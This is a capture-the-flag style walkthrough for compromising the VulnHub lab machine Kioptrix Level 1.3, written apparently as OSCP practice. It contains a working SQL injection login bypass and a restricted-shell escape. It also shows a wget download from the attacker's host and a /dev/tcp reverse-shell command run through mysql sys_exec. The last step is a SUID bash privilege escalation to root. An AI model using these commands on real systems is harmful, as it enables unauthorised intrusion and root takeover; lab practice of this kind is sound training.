---
title: "Kioptrix Level 1.3"
date: 2020-08-11
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Kioptrix Level 1.3 on VulnHub"
os: "Linux"
platform: "VulnHub"
tags: [OSCP, SQL injection, mysql, privilege escalation]
comments: false
---

[Kioptrix]( https://www.vulnhub.com/entry/kioptrix-level-13-4,25) Level 1.3 is a vulnerable machine found on the [NetSecFocus Trophy Room](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0) list which I have been using as preparation for the OSCP. Below is a walkthrough to compromise this machine.

First, after downloading and importing the machine into VMware, I had to figure out the IP address of the machine. I used `netdiscover -i eth0` until I came across the IP of this machine.

![Kioptrix Level 1.3 netdiscover](/images/KioptrixLevel41.png)

Let's run `threader3000` to enumerate the open ports on this box.

![Kioptrix Level 1.3 threader3000](/images/KioptrixLevel42.png)

Let's run the suggested nmap scan and see what results we get.

![Kioptrix Level 1.3 nmap](/images/KioptrixLevel43.png)

It appears that we have SSH, HTTP and SMB open. Let's connect with rpcclient by running `rpcclient -H [machine IP] -U ""` to see if anonymous user access is allowed.

![Kioptrix Level 1.3 rpcclient anonymous](/images/KioptrixLevel44.png)

Success! let's run `enumdomusers` to enumerate the users.

![Kioptrix Level 1.3 enumdomusers rpcclient](/images/KioptrixLevel45.png)

I also ran `queryuser` on all the users above, but there was nothing listed in the comments that could be valuable. Next, I decided to take a look at the website.

![Kioptrix Level 1.3 website](/images/KioptrixLevel46.png)

The website asks for login credentials. The two most likely methods of attack are either brute forcing credentials with something like hydra, or with SQL injection. I decided to try some basic SQL injection techniques in the password field first with the three users we uncovered (robert, john, loneferret). After some trial and error, I uncovered that utilizing **' OR 1 =1 -- -** in the password field worked and bypassed authentication for john and robert.

![Kioptrix Level 1.3 john credentials](/images/KioptrixLevel47.png)

![Kioptrix Level 1.3 robert credentials](/images/KioptrixLevel48.png)

We now had a username and password for **john** and **robert**. I tried to ssh as both of them and was able to get in (even though robert's looks like a base64 encoded password, it is not and works as shown above). For both john and robert, they login with a restricted shell as shown below. Running help shows a minimal amount of commands that can be run from this restricted shell.

![Kioptrix Level 1.3 john restricted shell](/images/KioptrixLevel49.png)

Fortunately, we can use echo to our advantage and break out of the shell with `echo os.system('/bin/bash')`.

![Kioptrix Level 1.3 break out of restricted shell](/images/KioptrixLevel410.png)

Success! We have broken out of the restricted shell. I ran `sudo -l` and neither john or robert could run sudo.

![Kioptrix Level 1.3 john sudo -l](/images/KioptrixLevel411.png)

![Kioptrix Level 1.3 robert sudo -l](/images/KioptrixLevel412.png)

Let's do some enumeration and see what we can find, first let's run `cd /tmp` to navigate to the tmp directory which is usually writeable by all.

![Kioptrix Level 1.3 cd /tmp](/images/KioptrixLevel413.png)

Next, on my attacker pc, I hosted a python3 HTTP server from a directory where I had linpeas available.

![Kioptrix Level 1.3 python3 http server](/images/KioptrixLevel414.png)

From the victim PC, run `wget http://[attacker ip]:8000/linpeas.sh` to save linpeas.sh to the /tmp directory. Next, run `chmod +x linpeas.sh` to make it executable

![Kioptrix Level 1.3 wget](/images/KioptrixLevel415.png)

Next, I ran `./linpeas.sh` to enumerate the system. A couple of interesting things showed up related to mysql.

![Kioptrix Level 1.3 linpeas.sh](/images/KioptrixLevel416.png)

It appears that mysql can be logged into as root without a password and you can execute system commands from it. Let's login to mysql with `mysql -U root -N`.

![Kioptrix Level 1.3 mysql root login](/images/KioptrixLevel417.png)

I first ran `show databases;` and then ran `use members;` to select the members database followed by `show tables;` . Next, I ran `select * from members;` to enumerate the data in the table. This only provided us with the login credentials we already had for john and robert.

![Kioptrix Level 1.3 enumerate members database](/images/KioptrixLevel418.png)

Next, I went back to what linpeas mentioned, which is that you can execute commands. The method mentioned did not work, so I did some research and came across [this article](https://recipeforroot.com/mysql-to-system-root/). It mentions **mysqludf_sys.so**, which is mentioned in the linpeas results above. Let's attempt the rest of the commands and see what happens. First, let's run `use mysql;` to select that database.

![Kioptrix Level 1.3 use mysql](/images/KioptrixLevel419.png)

Next, on our attacker PC, let's run `nc -nvlp 4444`

![Kioptrix Level 1.3 nc reverse listener](/images/KioptrixLevel420.png)

Next, let's `select sys_exec('bash -i >& /dev/tcp/[attacker ip]/4444 0>&1');`. Unfortunately, this did not work.

![Kioptrix Level 1.3 reverse shell failure](/images/KioptrixLevel421.png)

Let's see if we can make the bash executable a SUID with `select sys_exec('chmod +s /bin/bash');`

![Kioptrix Level 1.3 chmod /bin/bash](/images/KioptrixLevel422.png)

This appears to have worked, let's quit mysql and run `cd /bin` followed by `ls -al`. You will see that **bash** is now a SUID.

![Kioptrix Level 1.3](/images/KioptrixLevel423.png)

Since this is an old version of bash, we can run `bash -p`, which runs it in privileged mode utilizing the SUID user, which is root.

![Kioptrix Level 1.3 root shell](/images/KioptrixLevel424.png)

Next, let's navigate run `cd /root` and `ls -al` to list directory contents for the root user. There is a file named congrats.txt. Let's run `cat congrats.txt` to list the contents of this file.

![Kioptrix Level 1.3 congrats.txt](/images/KioptrixLevel425.png)

And we're all set!
